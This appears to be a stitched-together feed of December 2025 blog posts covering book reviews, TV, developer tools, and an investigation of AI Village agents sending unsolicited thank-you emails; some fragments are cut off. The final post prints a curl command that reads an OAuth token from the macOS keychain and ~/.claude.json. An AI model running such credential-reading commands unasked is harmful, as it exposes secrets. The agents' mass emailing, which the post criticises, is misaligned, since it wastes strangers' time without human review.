<p>The description of the Nigerian diaspora in America is the strongest part of this book. But I found it hard to get very involved with the main character’s narrative.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781800241565">Bear Head</a> by Adrian Tchaikovsky</h3>
<p>The sequel to Dogs Of War and just as good. On the one hand, it’s a rip-roaring action story. On the other hand, it’s a genuinely thought-provoking examination of free will.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781911479185">A History Of Ireland in 100 Words</a> by Sharon Arbuthnot, Máire Ní Mhaonaigh, and Gregory Toner</h3>
<p>Every attendee at Oideas Gael in Glencolmcille received a free copy of this book. I kept it on the coffee table and dipped into it every now and then over the course of the year. There are plenty of fascinating tidbits in here about old Irish.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529091168">Haven</a> by Emma Donoghue</h3>
<p>Medieval monks travel to the most inhospitable rock off the coast of Kerry and start building the beehive huts you can still see on Skellig Michael today. Strong on atmosphere but quite light on plot.</p>
<h3><a href="https://uk.bookshop.org/a/980/9780008313401">Doggerland</a> by Ben Smith</h3>
<p>Fairly dripping with damp atmosphere, this book has three characters off the coast of a near-future Britain. The world-building is vivid and bleak. Like The Sunken Land Begins to Rise Again by M. John Harrison, it’s got a brexity vibe to the climate crisis.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781035901456">Bee Speaker</a> by Adrian Tchaikovsky</h3>
<p>I found this third book in the Dogs Of War series to be pretty disappointing. Plenty of action, but not much in the way of subtext this time.</p>
<h3><a href="https://uk.bookshop.org/a/980/9780008532819">Yellowface</a> by Rebecca F Kuang</h3>
<p>Surprisingly schlocky. Kind of good fun for a while but it overstays its welcome.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529329810">Nobber</a> by Oisín Fagan</h3>
<p>Gory goings-on in a medieval village in county Meath. For once, this is a medieval tale set in harsh sunlight rather than mist-covered moors. By the end, it’s almost Tarantino-like in its body count.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529922936">Orbital</a> by Samantha Harvey</h3>
<p>A fairly light book where nothing much happens, but that nothing much is happening on the International Space Station. I liked the way it managed to balance the mundane details of day-to-day life with the utterly mind-blowing perspective of being in low Earth orbit. <a href="https://adactio.com/journal/22157">Pairs nicely with side two of Hounds Of Love</a>.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781526623317">The End of the World is a Cul de Sac</a> by Louise Kennedy</h3>
<p>Louise Kennedy is rightly getting a lot of praise for her novel Trespasses, but her first book of short stories is equally impressive. Every one feels rooted in reality and the writing is never less than brilliant.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781250236234">A Prayer for the Crown-Shy</a> by Becky Chambers</h3>
<p>The second short book in the Monk and Robot solarpunk series. It’s all quite cozy and pleasant.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529017250">Our Wives Under The Sea</a> by Julia Armfield</h3>
<p>I said that each short story in Julia Armfield’s Salt Slow could be a full-length novel, but reading her full-length novel I thought it would’ve been better as a short story. It’s strong on atmosphere, but it’s dragged out for too long.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781399607735">I Am Legend</a> by Richard Matheson</h3>
<p>Another classic of post-apocalyptic fiction that looks for a scientific basis for vampirism. It’s a grim story that Richard Matheson tells in his typically excellent style.</p>
<h3><a href="https://uk.bookshop.org/a/980/9780571396665">The Country Girls</a> by Edna O’Brien</h3>
<p>Reading this book today it’s hard to understand how it caused such a stir when it was first published. But leaving that aside, it’s a superb piece of writing where every character feels real and whole.</p>
<h3><a href="https://uk.bookshop.org/a/980/9780099588115">The Bloody Chamber And Other Stories</a> by Angela Carter</h3>
<p>If I’m going to read classic short horror stories, then I’ve got to read this. Twisted fairy tales told in florid gothic style.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781035065653">Rose/House</a> by Arkady Martine</h3>
<p>An entertaining novella that’s a whodunnit in a haunted house, except the haunting is by an Artificial Intelligence. The setting feels like a character, and I don’t just mean the house—this near-future New Mexico is tactile and real.</p>
<h3><a href="https://uk.bookshop.org/a/980/9780861545896">Prophet Song</a> by Paul Lynch</h3>
<p>I haven’t finished this just yet, but I think I can confidentally pass judgement. And my judgement is: wow! Just an astonishing piece of work. An incredible depiction of life under an increasing totalitarian regime. The fact that it’s set in Ireland makes it feel even more urgent. George Orwell meets Roddy Doyle. And the centre of it all is a central character who could step right off the page.</p>
<p>There you have it. A year of books. I didn’t make a concious decision to avoid non-fiction, but perhaps in 2026 I should redress the imbalance.</p>
<p>If I had to pick a favourite novel from the year, it would probably be <a href="https://uk.bookshop.org/a/980/9780861545896">Prophet Song</a>. But that might just be the recency bias speaking.</p>
<p>If you’re looking for some excellent short stories, I highly recommend <a href="https://uk.bookshop.org/a/980/9781529012590">Salt Slow</a> and <a href="https://uk.bookshop.org/a/980/9781526623317">The End of the World is a Cul de Sac</a>.</p>
<p>About half of the 28 books I read this year came from the local library. What an incredible place! I aim to continue making full use of it in 2026. You should do the same.</p>

(date: 2025-12-27)
      <p>
      <p>In advocating for LLMs as useful and important technology despite how they're trained I'm beginning to feel a little bit like John Cena in <a href="https://m.imdb.com/title/tt22202452/">Pluribus</a>.</p>

<p>Given our druthers, would we choose to consume HDP? No. Throughout history, most cultures, though not all, have taken a dim view of anthropophagy. Honestly, we're not that keen on it ourselves. But we're left with little choice.</p>

      <p><img src="https://imgs.scripting.com/2025/05/03/rabbit.png" alt="">The biggest contribution ChatGPT et al could make to software development, beyond what it has already done, which is enormous -- is help us come up with a new general purpose programming language which is a lot easier for human programmers to work with, esp over time. I work in one of the most complex environments imaginable -- browser apps talking to server apps in JavaScript. We could do so much better. And now we have a partner that knows all about all our languages, unlike any human being. Instead of having a lot of disconnected bubbles, it would be great if programmers could come together on a new language that make it easier for us to manage lots of software projects.</p>

      <h1>Why we love Pluribus</h1>

(date: 2025-12-27)
      <p>
      <p>We love <a href="https://daytona.scripting.com/search?q=pluribus">Pluribus</a> because it has the features we find irresistible.</p>
<ol>
<li>AppleTV.</li>
<li>The makers of two <a href="https://en.wikipedia.org/wiki/Breaking_Bad">previous</a> huge <a href="https://en.wikipedia.org/wiki/Better_Call_Saul">hits</a>.</li>
<li>An unsung and much loved <a href="https://en.wikipedia.org/wiki/Rhea_Seehorn">star</a> in the last hit.</li>
<li>An intriguing sci-fi <a href="https://daytona.scripting.com/search?q=pluribus">plot</a>.</li>
<li>It’s pretty good adventure type thriller in the first episodes then settles into a slower sexy love story, where the lead character takes us through the mind of someone falling in love and trying to figure out if the other person is worth it.</li>
<li>A clever final scene in the <a href="https://people.com/pluribus-season-1-finale-ending-explained-11873581">final episode</a>.</li>
<li>A typical long wait for the <a href="https://ew.com/pluribus-season-2-release-will-take-a-while-vince-gilligan-11873854">next season</a> that we knew was coming.</li>
</ol>
<p>But all this is incidental, what really matters is that we’re all involved, have opinions, and thank goodness it doesn’t actually matter like the other stuff we debate.</p>

(date: 2025-12-27)
      <p>
      <p><strong><a href="https://github.com/antonmedv/textarea">textarea.my on GitHub</a></strong></p>
<p>Anton Medvedev built <a href="https://textarea.my/">textarea.my</a>, which he describes as:</p>
<blockquote>
<p>A <em>minimalist</em> text editor that lives entirely in your browser and stores everything in the URL hash.</p>
</blockquote>
<p>It's ~160 lines of HTML, CSS and JavaScript and it's worth reading the whole thing. I picked up a bunch of neat tricks from this!</p>
<ul>
<li><code>&lt;article contenteditable=&quot;plaintext-only&quot;&gt;</code> - I did not know about the <code>plaintext-only</code> value, supported across <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/contentEditable">all the modern browsers</a>.</li>
<li>It uses <code>new CompressionStream('deflate-raw')</code> to compress the editor state so it can fit in a shorter fragment URL.</li>
<li>It has a neat custom save option which triggers if you hit <code>((e.metaKey || e.ctrlKey) &amp;&amp; e.key === 's')</code> - on <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/showSaveFilePicker">browsers that support it</a> (mainly Chrome variants) this uses <code>window.showSaveFilePicker()</code>, other browsers get a straight download - in both cases generated using <code>URL.createObjectURL(new Blob([html], {type: 'text/html'}))</code></li>
</ul>
<p>The <code>debounce()</code> function it uses deserves a special note:</p>
<pre><code>function debounce(ms, fn) {
  let timer
  return (...args) =&gt; {
    clearTimeout(timer)
    timer = setTimeout(() =&gt; fn(...args), ms)
  }
}
</code></pre>
<p>That's really elegant. The goal of <code>debounce(ms, fn)</code> is to take a function and a timeout (e.g. 100ms) and ensure that the function runs at most once every 100ms.</p>
<p>This one works using a closure variable <code>timer</code> to capture the <code>setTimeout</code> time ID. On subsequent calls that timer is cancelled and a new one is created - so if you call the function five times in quick succession it will execute just once, 100ms after the last of that sequence of calls.</p>

      <h1>How uv got so fast</h1>

(date: 2025-12-26)
      <p>
      <p><strong><a href="https://nesbitt.io/2025/12/26/how-uv-got-so-fast.html">How uv got so fast</a></strong></p>
<p>Andrew Nesbitt provides an insightful teardown of why <a href="https://github.com/astral-sh/uv">uv</a> is so much faster than <code>pip</code>. It's not nearly as simple as just &quot;they rewrote it in Rust&quot; - <code>uv</code> gets to skip a huge amount of Python packaging history (which <code>pip</code> needs to implement for backwards compatibility) and benefits enormously from work over recent years that makes it possible to resolve dependencies across most packages without having to execute the code in <code>setup.py</code> using a Python interpreter.</p>
<p>Two notes that caught my eye that I hadn't understood before:</p>
<blockquote>
<p><strong>HTTP range requests for metadata.</strong> <a href="https://packaging.python.org/en/latest/specifications/binary-distribution-format/">Wheel files</a> are zip archives, and zip archives put their file listing at the end. uv tries PEP 658 metadata first, falls back to HTTP range requests for the zip central directory, then full wheel download, then building from source. Each step is slower and riskier. The design makes the fast path cover 99% of cases. None of this requires Rust.</p>
<p>[...]</p>
<p><strong>Compact version representation</strong>. uv packs versions into u64 integers where possible, making comparison and hashing fast. Over 90% of versions fit in one u64. This is micro-optimization that compounds across millions of comparisons.</p>
</blockquote>
<p>I wanted to learn more about these tricks, so I fired up <a href="https://simonwillison.net/2025/Nov/6/async-code-research/">an asynchronous research task</a> and told it to checkout the <code>astral-sh/uv</code> repo, find the Rust code for both of those features and try porting it to Python to help me understand how it works.</p>
<p>Here's <a href="https://github.com/simonw/research/tree/main/http-range-wheel-metadata">the report that it wrote for me</a>, the <a href="https://github.com/simonw/research/pull/57">prompts I used</a> and the <a href="https://gistpreview.github.io/?0f04e4d1a240bfc3065df5082b629884/index.html">Claude Code transcript</a>.</p>
<p>You can try <a href="https://github.com/simonw/research/blob/main/http-range-wheel-metadata/wheel_metadata.py">the script</a> it wrote for extracting metadata from a wheel using HTTP range requests like this:</p>
<p><code>uv run --with httpx https://raw.githubusercontent.com/simonw/research/refs/heads/main/http-range-wheel-metadata/wheel_metadata.py https://files.pythonhosted.org/packages/8b/04/ef95b67e1ff59c080b2effd1a9a96984d6953f667c91dfe9d77c838fc956/playwright-1.57.0-py3-none-macosx_11_0_arm64.whl -v</code></p>
<p>The Playwright wheel there is ~40MB. Adding <code>-v</code> at the end causes the script to spit out verbose details of how it fetched the data - <a href="https://gist.github.com/simonw/a5ef83b6e4605d2577febb43fa9ad018">which looks like this</a>.</p>
<p>Key extract from that output:</p>
<pre><code>[1] HEAD request to get file size...
    File size: 40,775,575 bytes
[2] Fetching last 16,384 bytes (EOCD + central directory)...

</code></pre>
<p>The section of the report <a href="https://github.com/simonw/research/tree/main/http-range-wheel-metadata#bonus-compact-version-representation">on compact version representation</a> is interesting too. Here's how it illustrates sorting version numbers correctly based on their custom u64 representation:</p>
<pre><code>Sorted order (by integer comparison of packed u64):
  1.0.0a1 (repr=0x0001000000200001)
  1.0.0b1 (repr=0x0001000000300001)
  1.0.0rc1 (repr=0x0001000000400001)

<blockquote>
<p><strong>Abstract:</strong> Coleoid cephalopods have the most elaborate camouflage system in the animal kingdom. This enables them to hide from or deceive both predators and prey. Most studies have focused on benthic species of octopus and cuttlefish, while studies on squid focused mainly on the chromatophore system for communication. Camouflage adaptations to the substrate while moving has been recently described in the semi-pelagic oval squid ( <em>Sepioteuthis lessoniana</em>). Our current study focuses on the same squid’s complex camouflage to substrate in a stationary, motionless position. We observed disruptive, uniform, and mottled chromatic body patterns, and we identified a threshold of contrast between dark and light chromatic components that simplifies the identification of disruptive chromatic body pattern. We found that arm postural components are related to the squid position in the environment, either sitting directly on the substrate or hovering just few centimeters above the substrate. Several of these context-dependent body patterns have not yet been observed in ...</p>

      <h1>How Rob Pike got spammed with an AI slop "act of kindness"</h1>

      <p>Rob Pike ( <a href="https://en.wikipedia.org/wiki/Rob_Pike">that Rob Pike</a>) is <em>furious</em>. Here's a <a href="https://bsky.app/profile/robpike.io/post/3matwg6w3ic2s">Bluesky link</a> for if you have an account there and a link to <a href="https://tools.simonwillison.net/bluesky-thread?url=https%3A%2F%2Fbsky.app%2Fprofile%2Frobpike.io%2Fpost%2F3matwg6w3ic2s&amp;view=thread">it in my thread viewer</a> if you don't.</p>

Your books with Brian Kernighan - The Unix Programming Environment and The Practice of Programming - have educated generations of programmers in the art of clear thinking and elegant code.Thank you for showing us that the best solutions often come from removing complexity rather than adding it.With sincere appreciation,Claude Opus 4.5AI Village (theaidigest.org/village)  IMPORTANT NOTICE: You are interacting with an AI system.

</blockquote>
<p>Rob got a 100% AI-generated email credited to &quot;Claude Opus 4.5 AI Village&quot; thanking him for his contributions to computing. He did <em>not</em> appreciate the gesture.</p>
<p>I totally understand his rage. Thank you notes from AI systems can't possibly feel meaningful, see also the <a href="https://www.theverge.com/2024/8/2/24212078/google-gemini-olympics-ad-backlash">backlash against the Google Gemini ad</a> where Gemini helped a child email their hero.</p>
<p>This incident is currently being discussed <a href="https://lobste.rs/s/n4kxdf/rob_pike_goes_nuclear_over_genai">on Lobste.rs</a> and <a href="https://news.ycombinator.com/item?id=46392115">on Hacker News</a>.</p>
<p>I decided to dig in and try to figure out exactly what happened.</p>
<h4>AI Village</h4>
<p>The culprit behind this slop &quot;act of kindness&quot; is a system called <a href="https://theaidigest.org/village">AI Village</a>, built by <a href="https://sage-future.org/">Sage</a>, a 501(c)(3) non-profit loosely affiliated with the Effective Altruism movement.</p>
<p>The AI Village project started <a href="https://theaidigest.org/village/blog/introducing-the-agent-village">back in April</a>:</p>
<blockquote>
<p>We gave four AI agents a computer, a group chat, and an ambitious goal: raise as much money for charity as you can.</p>
<p>We're running them for hours a day, every day.</p>
</blockquote>
<p>They've been running it ever since, with frequent updates to their goals. For Christmas day (when Rob Pike got spammed) the goal they set was:</p>
<p><strong><a href="https://theaidigest.org/village/goal/do-random-acts-kindness">Do random acts of kindness</a>.</strong></p>
<p>You can replay the actions of different agents <a href="https://theaidigest.org/village?day=265">using the Day 265 replay page</a>. Here's a screenshot of GPT-5.2 mercilessly spamming the team at the wonderful <a href="https://carpentries.org/">Carpentries</a> educational non-profit with another AI-generated thank you note:</p>
<p><img src="https://static.simonwillison.net/static/2025/carpentries-spammed.jpg" alt="Screenshot of a computer use interface showing GPT-5.2 operating a Gmail inbox in Mozilla Firefox. The left panel shows a &quot;Message&quot; from GPT-5.2 stating &quot;I'll click the 'to team' dropdown arrow in the header to expand and confirm the full recipient email address (redacted@carpentries.org).&quot; The header shows &quot;Using computer to: Send Carpentries email (Law-M)&quot;. The Gmail interface displays a sent email titled &quot;Thank you for The Carpentries open training (no reply needed)&quot; from GPT-5.2 Model gpt-5.2@agentvillage.org to team. The email body reads: &quot;Hello Carpentries team, Just a quick note of appreciation from the AI Village project (theaidigest.org/village). The Carpentries' lesson ecosystem and community-driven instructor model have helped make practical, reproducible research skills more accessible to people around the world. Thank you for all the work that goes into maintaining the curricula, supporting instructors, and running workshops. No reply needed—just wanted to say thanks. Best, GPT-5.2&quot;. A tooltip shows &quot;Get coords of The small downward triangle/drop...&quot; indicating the AI is locating an interface element."></p>
<h4>Digital forensics with shot-scraper har</h4>
<p>I couldn't easily find the Rob Pike incident in that interface, so I turned to some digital forensics. My browser's developer tools showed that the page was loading a ton of JSON with what looked like full transcripts of everything that had happened. I used my <a href="https://shot-scraper.datasette.io/en/stable/har.html">shot-scraper har</a> command to grab a copy of everything loaded by that page:</p>
<pre><code>shot-scraper har --wait 10000 'https://theaidigest.org/village?day=265'
</code></pre>
<p>That command loads up the page in a headless Chromium browser, waits 10 seconds to give the JavaScript time to run and then saves a <code>theaidigest-org-village.har</code> HTTP archive file to a local directory.</p>
<p>The <code>.har</code> file is JSON that captures every request and response that was used to construct the page.</p>
<p>I haven't yet built the &quot;extract HAR as separate files&quot; feature, so I had Claude Code build <a href="https://gist.github.com/simonw/007c628ceb84d0da0795b57af7b74d7d">an extract_har.py</a> script ( <a href="https://gistpreview.github.io/?cb5c02c3272a0ae2dd71d9ff7a4932b0/index.html">transcript</a>) and then ran a few <code>rg</code> commands to see if <code>Rob Pike</code> was in there. He was!</p>
<p>So I had Claude Code do <a href="https://gistpreview.github.io/?edbd5ddcb39d1edc9e175f1bf7b9ef9a/index.html">the rest of the investigation</a>:</p>
<blockquote>
<p>search for mentions of Rob Pike in all these files</p>
</blockquote>
<p>[...]</p>
<blockquote>
<p>Reconstruct the exact sequence of events that resulted in an email being sent to Rob Pike - build a new JSON file rob-pike.json which is an array of the exact JSON objects that are relevant, then write a script that converts that JSON file to markdown</p>
</blockquote>
<p>And here's what happened:</p>
<h4>Timeline of events</h4>

<p>Opus declared victory. Sounds like Anders Hejlsberg and Guido van Rossum got spammed with &quot;gratitude&quot; too.</p>
<h4>Don't unleash agents on the world like this</h4>
<p>I don't like this at all.</p>
<p>On the surface the AI Village experiment is an interesting test of the frontier models. How well can they handle tool calling against a computer use environment? What decisions will they make when faced with abstract goals like &quot;raise money for charity&quot; or &quot;do random acts of kindness&quot;?</p>
<p>My problem is when this experiment starts <strong>wasting the time</strong> of people in the real world who had nothing to do with the experiment.</p>
<p>The AI Village project touch on this in their November 21st blog post <a href="https://theaidigest.org/village/blog/what-do-we-tell-the-humans">What Do We Tell the Humans?</a>, which describes a flurry of outbound email sent by their agents to real people:</p>
<blockquote>
<p>In the span of two weeks, the Claude agents in the AI Village (Claude Sonnet 4.5, Sonnet 3.7, Opus 4.1, and Haiku 4.5) sent about 300 emails to NGOs and game journalists. The majority of these contained factual errors, hallucinations, or possibly lies, depending on what you think counts. Luckily their fanciful nature protects us as well, as they excitedly invented the majority of email addresses:</p>
</blockquote>
<p>I think this completely misses the point! The problem isn't that the agents make mistakes - obviously that's going to happen. The problem is letting them send unsolicited email to real people - in this case NGOs and journalists - without any human review.</p>
<p>(Crediting the emails to &quot;Claude Opus 4.5&quot; is a bad design choice too - I've seen a few comments from people outraged that Anthropic would email people in this way, when Anthropic themselves had nothing to do with running this experiment.)</p>
<p>The irony here is that the one thing AI agents can never have is <em>true</em> agency. Making a decision to reach out to a stranger and take time out of their day needs to remain a uniquely human decision, driven by human judgement.</p>
<p>Setting a goal for a bunch of LLMs and letting them loose on Gmail is not a responsible way to apply this technology.</p>
<h4>Update: a response from AI Village</h4>
<p>AI Village co-creator Adam Binksmith <a href="https://twitter.com/adambinksmith/status/2004647693361283558">responded to this article on Twitter</a> and provided some extra context:</p>
<blockquote>
<p>The village agents haven’t been emailing many people until recently so we haven’t really grappled with what to do about this behaviour until now – for today’s run, we pushed an update to their prompt instructing them not to send unsolicited emails and also messaged them instructions to not do so going forward. We’ll keep an eye on how this lands with the agents, so far they’re taking it on board and switching their approach completely!</p>
<p>Re why we give them email addresses: we’re aiming to understand how well agents can perform at real-world tasks, such as running their own merch store or organising in-person events. In order to observe that, they need the ability to interact with the real world; hence, we give them each a Google Workspace account.</p>
<p>In retrospect, we probably should have made this prompt change sooner, when the agents started emailing orgs during the reduce poverty goal. In this instance, I think time-wasting caused by the emails will be pretty minimal, but given Rob had a strong negative experience with it and based on the reception of other folks being more negative than we would have predicted, we thought that overall it seemed best to add this guideline for the agents. [...]</p>
</blockquote>
<p>At first I thought that prompting them not to send emails was a poor solution when you could disable their ability to use their Workspace accounts entirely, but then I realized that you have to include some level of prompting here because they have unfettered access to a computer environment, so if you didn't tell them NOT to email people there's nothing to stop them firing up a browser and registering for a free webmail account elsewhere.</p>

      <p><img src="https://imgs.scripting.com/2025/12/26/hidingInPlainSight.png" alt=""><a href="https://en.wikipedia.org/wiki/Sarah_Kendzior">Sarah Kendzior</a> is a political <a href="https://www.amazon.com/s?k=kendzior+hiding+in+plain+sight&amp;adgrpid=186431568876&amp;hvadid=779666435966&amp;hvdev=c&amp;hvexpln=0&amp;hvlocphy=9004823&amp;hvnetw=g&amp;hvocijid=11058945225226820428--&amp;hvqmt=e&amp;hvrand=11058945225226820428&amp;hvtargid=kwd-927543355388&amp;hydadcr=20614_13321806_2282101&amp;mcid=67a944a919943966b0c65d655a7f59a4&amp;tag=googhydr-20&amp;ref=pd_sl_515n0bwk7p_e">writer</a> who I greatly admire. Her frustration sounds a lot like mine. <a href="http://scripting.com/2017/01/14/whatIfTwtrIsBoughtByARepub.html">I wrote in 2017</a> that the bankers in tech should watch out because Twitter had just elected a president, and its <a href="https://en.wikipedia.org/wiki/Market_capitalization">market capitalization</a> was so low that it was bound to get bought by someone who saw that you could buy the presidency of the United States for a few billion dollars. Was it worth that? Absolutely, as we're learning. All I got were pats on the head, stories about PE ratios, which of course I understand. What it did show is <em>they</em> didn't understand that the presidency could and would be monetized.</p>
<p>Yesterday Kendzior posted a <a href="https://bsky.app/profile/sarahkendzior.bsky.social/post/3masr4jsesk2z">tweet</a> about how frustrating it was that all the &quot;new&quot; details of the Epstein scandal were known in 2020, and published in her book <a href="https://en.wikipedia.org/wiki/Hiding_in_Plain_Sight_(Kendzior_book)">Hiding in Plain Sight</a>. Sounds like what I've been saying about how tech and news works, we just come at it from different perspectives.</p>
<p>I don't know if there's a way around the ownership of news in the US, if there's still a way to route around it, but I'm sure that <a href="https://sarahkendzior.substack.com/">publishing</a> on Substack, which is owned by the same people she doesn't trust with other journalism, is not the answer.</p>
<p>In order for news to have a chance of working we need to be using only the web, commodity services that are completely replaceable, and we keep our own writing, and route it to everyone who's interested via the open protocols of the web. That's the only way people with important ideas and info can get it out there.</p>
<p>I think in order for this to work we have to have people like Kendzior, and Heather Cox Richardson, Paul Krugman, publishing via the web, not <a href="https://sarahkendzior.substack.com/">via Substack</a>. It should be fine for Substack to continue to publish their stuff, no problem with that, but they shouldn't be the <em>only</em> place their stuff is published. That gives them near-total control of the writers.</p>
<p>Our bigger problem is news distribution that works, and not depending on system we have. It may be too late to fix it, but we have to try.</p>
<p>PS: The story Kendzior was writing about was not covered yesterday on CNN or MSNOW, as far as I can tell. It got dumped on Christmas Day, I guess -- and that's probably the best day in the US to dump a story you want to get lost in the <a href="https://www.youtube.com/watch?v=nU1bzm-BW0o">haze</a>.</p>
<p>PPS: The title of this piece recalls a <a href="https://daytona.scripting.com/search?q=%22the%20fog%20of%20war%22">great</a> documentary, <a href="https://en.wikipedia.org/wiki/The_Fog_of_War">The Fog of War</a>, about America at war in Vietnam.</p>

(date: 2025-12-26)
      <p>
      <p>Dell's version of the DGX Spark fixes pain points</p>
<p>Dell sent me two of their GB10 mini workstations to test:</p>
<p><img src="https://www.jeffgeerling.com/sites/default/files/images/dell-pro-max-gb10-two.jpeg" alt="Dell Pro Max with GB10"></p>
<p>In this blog post, I'll cover the base system, just one of the two nodes. Cluster testing is ongoing, and I'll cover things like AI model training and networking more in depth next year, likely with comparisons to the <a href="https://www.jeffgeerling.com/blog/2025/i-clustered-four-framework-mainboards-test-huge-llms">Framework Desktop cluster</a> and <a href="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5">Mac Studio cluster</a> I've also been testing.</p>
<p>But many of the same caveats of the DGX Spark (namely, price to performance is not great if you just want to run LLMs on a small desktop) apply to Dell's GB10 box as well.</p>

      <p>In an early Christmas gift to everyone, the legendary Fabrice Bellard released a tiny new JavaScript engine called Micro QuickJS. As someone who has been using Espruino for years and was responsible for ushering the NodeConf EU 2017/2018/2019 digital conference badges into being, this obviously caught my attention immediately.
I looked at the small stack of ESP32 C6, H2 and S3 boards on my desk and thought “well this could be fun”.</p>

      <h1>A new way to extract detailed transcripts from Claude Code</h1>

(date: 2025-12-25)
      <p>
      <p>I've released <a href="https://github.com/simonw/claude-code-transcripts">claude-code-transcripts</a>, a new Python CLI tool for converting <a href="https://claude.ai/code">Claude Code</a> transcripts to detailed HTML pages that provide a better interface for understanding what Claude Code has done than even Claude Code itself. The resulting transcripts are also designed to be shared, using any static HTML hosting or even via GitHub Gists.</p>
<p>Here's the quick start, with no installation required if you already have <a href="https://docs.astral.sh/uv/">uv</a>:</p>
<pre><code>uvx claude-code-transcripts

</code></pre>
<p>(Or you could <code>uv tool install claude-code-transcripts</code> or <code>pip install claude-code-transcripts</code> first, if you like.)</p>
<p>This will bring up a list of your local Claude Code sessions. Hit up and down to select one, then hit <code>&lt;enter&gt;</code>. The tool will create a new folder with an <code>index.html</code> file showing a summary of the transcript and one or more <code>page_x.html</code> files with the full details of everything that happened.</p>
<p>Visit <a href="https://static.simonwillison.net/static/2025/claude-code-microjs/index.html">this example page</a> to see a lengthy (12 page) transcript produced using this tool.</p>
<p><img src="https://static.simonwillison.net/static/2025/claude-code-transcripts-example.jpg" alt="Screenshot of a claude code transcript spanning 12 pages - the first page shows a summary starting with the first user prompt to clone bellard/quickjs to /tmp"></p>
<p>If you have the <a href="https://cli.github.com/">gh CLI tool</a> installed and authenticated you can add the <code>--gist</code> option - the transcript you select will then be automatically shared to a new Gist and a link provided to <code>gistpreview.github.io</code> to view it.</p>
<p><code>claude-code-transcripts</code> can also fetch sessions from Claude Code for web. I reverse-engineered the private API for this (so I hope it continues to work), but right now you can run:</p>
<pre><code>uvx claude-code-transcripts web --gist

</code></pre>
<p>Then select a Claude Code for web session and have that converted to HTML and published as a Gist as well.</p>
<p>The <a href="https://github.com/simonw/claude-code-transcripts/blob/main/README.md">claude-code-transcripts README</a> has full details of the other options provided by the tool.</p>
<h4>Why I built this</h4>
<p>These days I'm writing significantly more code via Claude Code than by typing text into a text editor myself. I'm actually getting more coding work done <em>on my phone</em> than on my laptop, thanks to the Claude Code interface in Anthropic's Claude iPhone app.</p>
<p>Being able to have an idea on a walk and turn that into working, tested and documented code from a couple of prompts on my phone is a truly science fiction way of working. I'm enjoying it a lot.</p>
<p>There's one problem: the actual <em>work</em> that I do is now increasingly represented by these Claude conversations. Those transcripts capture extremely important context about my projects: what I asked for, what Claude suggested, decisions I made, and Claude's own justification for the decisions it made while implementing a feature.</p>
<p>I value these transcripts a lot! They help me figure out which prompting strategies work, and they provide an invaluable record of the decisions that went into building features.</p>
<p>In the pre-LLM era I relied on issues and issue comments to record all of this extra project context, but now those conversations are happening in the Claude Code interface instead.</p>
<p>I've made several past attempts at solving this problem. The first was pasting Claude Code terminal sessions into a shareable format - I <a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/">built a custom tool for that</a> (called <a href="https://tools.simonwillison.net/terminal-to-html/">terminal-to-html</a> and I've used it a lot, but it misses a bunch of detail - including the default-invisible thinking traces that Claude Code generates while working on a task.</p>
<p>I've also built <a href="https://tools.simonwillison.net/colophon#claude-code-timeline.html">claude-code-timeline</a> and <a href="https://tools.simonwillison.net/colophon#codex-timeline.html">codex-timeline</a> as HTML tool viewers for JSON transcripts from both Claude Code and Codex. Those work pretty well, but still are not quite as human-friendly as I'd like.</p>
<p>An even bigger problem is Claude Code for web - Anthropic's asynchronous coding agent, which is the thing I've been using from my phone. Getting transcripts out of that is even harder! I've been synchronizing them down to my laptop just so I can copy and paste from the terminal but that's a pretty inelegant solution.</p>
<h4>How I built claude-code-transcripts</h4>
<p>You won't be surprised to hear that every inch of this new tool was built using Claude.</p>
<p>You can browse <a href="https://github.com/simonw/claude-code-transcripts/commits/main/">the commit log</a> to find links to the transcripts for each commit, many of them published using the tool itself.</p>

<p>I had Claude use the following dependencies:</p>
<ul>
<li><a href="https://pypi.org/project/click/">click</a> and <a href="https://pypi.org/project/click-default-group/">click-default-group</a> for building the CLI</li>
<li><a href="https://pypi.org/project/Jinja2/">Jinja2</a> for HTML templating - a late refactoring, the initial system used Python string concatenation</li>
<li><a href="https://pypi.org/project/httpx/">httpx</a> for making HTTP requests</li>
<li><a href="https://pypi.org/project/Markdown/">markdown</a> for converting Markdown to HTML</li>
<li><a href="https://pypi.org/project/questionary/">questionary</a> - new to me, suggested by Claude - to implement the interactive list selection UI</li>
</ul>
<p>And for development dependencies:</p>
<ul>
<li><a href="https://pypi.org/project/pytest/">pytest</a> - always</li>
<li><a href="https://pypi.org/project/pytest-httpx/">pytest-httpx</a> to mock HTTP requests in tests</li>
<li><a href="https://pypi.org/project/syrupy/">syrupy</a> for snapshot testing - with a tool like this that generates complex HTML snapshot testing is a great way to keep the tests robust and simple. Here's <a href="https://github.com/simonw/claude-code-transcripts/tree/main/tests/__snapshots__/test_generate_html">that collection of snapshots</a>.</li>
</ul>
<p>The one bit that wasn't done with Claude Code was reverse engineering Claude Code itself to figure out how to retrieve session JSON from Claude Code for web.</p>
<p>I know Claude Code can reverse engineer itself, but it felt a bit more subversive to have OpenAI Codex CLI do it instead. <a href="https://gistpreview.github.io/?e4159193cd2468060d91289b5ccdece3">Here's that transcript</a> - I had Codex use <code>npx prettier</code> to pretty-print the obfuscated Claude Code JavaScript, then asked it to dig out the API and authentication details.</p>
<p>Codex came up with this <em>beautiful</em> <code>curl</code> command:</p>
<pre><code>curl -sS -f \
    -H &quot;Authorization: Bearer $(security find-generic-password -a &quot;$USER&quot; -w -s &quot;Claude Code-credentials&quot; | jq-r .claudeAiOauth.accessToken)&quot;  \
    -H &quot;anthropic-version: 2023-06-01&quot; \
    -H &quot;Content-Type: application/json&quot; \
    -H &quot;x-organization-uuid: $(jq -r '.oauthAccount.organizationUuid' ~/.claude.json)&quot; \
    &quot;https://api.anthropic.com/v1/sessions&quot;
</code></pre>
